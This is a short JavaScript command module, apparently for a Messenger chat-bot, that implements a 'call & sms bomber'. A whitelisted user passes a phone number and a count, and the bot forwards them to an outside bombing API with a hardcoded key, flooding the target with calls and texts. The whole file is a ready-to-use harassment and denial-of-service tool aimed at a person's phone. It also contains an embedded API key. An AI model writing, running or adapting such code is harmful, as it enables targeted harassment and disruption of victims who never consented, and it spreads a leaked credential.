const axios = require('axios');
const apiUrl = "https://www.noobs-api.top/dipto";

const allowedUIDs = ['61555466267071', '100067540204855'];

module.exports.config = {
  name: "bomber",
  version: "6.9",
  author: "dipto",
  countDown: 5,
  role: 0,
  category: "admin",
  description: "call & sms bomber",
  usages: "{pn} number",
  premium: true 
};

module.exports.onStart = async ({ api, args, message, event }) => {
  try {
    if (!allowedUIDs.includes(event.senderID)) {
      return message.reply("Only users approved by Boss Zihad can drop bombs here. You're not on the list, bro!🙂🫶");
    }

    const number = args[0];
    const limit = args[1];
    const ok = await message.reply("Please wait... preparing your bomb!");

    const { data } = await axios.get(`${apiUrl}/bomber?number=${number}&limit=${limit || 1}&key=dipto00869`);

    message.unsend(ok.messageID);
    message.reply(data.message);
  } catch (error) {
    console.error(error);
    message.reply("Server error occurred: " + error.message);
  }
};
